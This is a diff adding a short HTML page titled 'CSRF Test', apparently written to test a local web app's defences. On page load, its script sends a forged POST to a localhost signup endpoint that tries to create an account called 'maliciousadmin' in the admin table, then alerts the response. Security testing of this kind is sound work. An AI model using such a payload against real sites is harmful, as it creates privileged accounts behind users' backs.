@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>CSRF Attack Test</h1>
+    
+    <script>
+        // Try to create an admin account without user knowledge
+        fetch('http://localhost:300/account/signup', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                username: "maliciousadmin",
+                email: "hacker@gmail.com",
+                password: "hacked123",
+                birth_date: "1990-01-01",
+                table: "admin"
+            })
+        }).then(response => response.json()).then(data => {
+            console.log('CSRF Attack Result:', data);
+            alert('CSRF Attack Attempted: ' + JSON.stringify(data));
+        });
+    </script>
+</body>
+</html>
